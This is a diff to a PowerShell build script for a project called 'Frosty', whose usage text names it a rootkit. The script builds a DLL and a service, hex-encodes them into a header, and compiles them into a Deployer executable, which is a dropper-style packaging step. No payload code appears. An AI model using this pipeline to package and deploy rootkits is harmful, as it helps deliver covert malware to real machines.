@@ -29,11 +29,15 @@ function BuildProject {
         [string]$outputPath,
         [string[]]$msbFlags
     )
+	
+	$dllOutputPath = $outputPath + "*.dll"
+	$exeOutputPath = $outputPath + "*.exe"
 
     Write-Host "[*] Building project: $solutionPath"
     & $MSBUILD $solutionPath $msbFlags
     if ($LASTEXITCODE -ne 0) { throw "Failed to build project $solutionPath" }
-    Copy-Item $outputPath -Destination ".\build\" -Force
+    Copy-Item $exeOutputPath -Destination ".\build\" -Force
+	Copy-Item $dllOutputPath -Destination ".\build\" -Force
 }
 
 function ConvertToHex {
@@ -65,8 +69,16 @@ function InitializeBuildDirectory {
 }
 
 if (-not $args[1]) {
-    Write-Host "[-] Add the architecture (x64/x86). Ex:"
-    Write-Host ".\builder.ps1 <MSBuildPath> x64"
+	$helpText = @"
+Usage: .\buider.ps1 [VALUES]
+    Values:
+      MSBUILDFILE,            MsBuild.exe File (Default: C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe)
+      ARCH,                   Rootkit Architecture (x64/x86)
+
+    Examples:
+      .\builder.ps1 "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" x64
+"@
+    Write-Host $helpText
     exit
 }
 
@@ -76,13 +88,14 @@ $MSB_FLAGS = @("/t:Rebuild", "/p:Configuration=Release", "/p:Platform=$platform"
 InitializeBuildDirectory
 
 try {
-    BuildProject "Frosty.sln" ".\x64\Release\*.exe" $MSB_FLAGS
+    BuildProject "Frosty.sln" ".\x64\Release\" $MSB_FLAGS
     $rkDllHex = ConvertToHex "$pwd\build\Dll.dll"
     $rkServiceHex = ConvertToHex "$pwd\build\Service.exe"
 
+	echo "" > Deployer/Deployer/Raw.h
     WriteToRawFile "rkDll" $rkDllHex
     WriteToRawFile "rkService" $rkServiceHex
-
+	
     Set-Location "Deployer"
     BuildProject "Deployer.sln" ".\x64\Release\Deployer.exe" $MSB_FLAGS
     Set-Location ".."
